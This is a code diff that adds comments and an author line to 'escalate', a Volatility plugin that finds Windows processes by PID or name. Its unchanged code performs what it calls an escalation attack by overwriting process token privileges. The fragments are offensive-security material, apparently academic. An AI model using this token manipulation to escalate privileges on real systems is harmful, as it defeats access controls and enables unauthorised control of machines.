@@ -2,6 +2,7 @@
 #
 # Authors
 # Adam Traub <traubad@vcu.edu>
+# Sourab Vadlamani <vadlamanis3@vcu.edu>
 #
 # This file is part of Volatility.
 #
@@ -32,6 +33,7 @@ class escalate(common.AbstractWindowsCommand):
     def __init__(self, config, *args, **kwargs):
         common.AbstractWindowsCommand.__init__(self, config, *args, **kwargs)
 
+        # Add command line options
         self._config.add_option('PID', short_option='i', type="string", default=None,
             help='ID of Process to Escalate, multiple pids can be separated with commas', action='store')
 
@@ -44,6 +46,7 @@ class escalate(common.AbstractWindowsCommand):
         self._config.add_option('ALL', short_option='a', action="store_true",
             help="Escalate all Processes", default=False)
 
+        # If invalid command line arguments
         if self._config.PID is None and self._config.NAME is None and not self._config.ALL and not self._config.help:
             raise(Exception("Either a process id or a Process name is required e.g." +
                             "\n\tescalate -i 1104 --write" +
@@ -56,14 +59,18 @@ class escalate(common.AbstractWindowsCommand):
         self._addrspace = None
         self._proc = None
 
+
     def get_target_proc(self, pid):
         '''
         Gets the target process' data structure
         :param pid: The target PID
         :return: The target process
         '''
+
+        # Get all active processes
         procs = win32.tasks.pslist(self._addrspace)
 
+        # Get proceess with specified PID
         for proc in procs:
             if proc.UniqueProcessId.v() == pid:
                 offset = proc.v()
@@ -79,6 +86,8 @@ class escalate(common.AbstractWindowsCommand):
         Performs the escalation attack
         :return: Nothing
         '''
+
+        # Set privilege of target process(s) to specified escalated privileges
         for proc in self._proc:
             proc.get_token().Privileges.Enabled = self.PRIV
 
@@ -89,6 +98,8 @@ class escalate(common.AbstractWindowsCommand):
         :param name: THe target process' name
         :return: The target process' PID
         '''
+
+        # Get all processes and return PID of process which name matches with specified name
         for proc in win32.tasks.pslist(self._addrspace):
             if str(proc.ImageFileName) == name:
                 return proc.UniqueProcessId.v()
@@ -102,6 +113,8 @@ class escalate(common.AbstractWindowsCommand):
         :param name: THe target process' pid
         :return: The target process' name
         '''
+
+        # Get all processes and return name of process whose PID matches supplied PID
         for proc in win32.tasks.pslist(self._addrspace):
             if proc.UniqueProcessId.v() == pid:
                 return str(proc.ImageFileName)
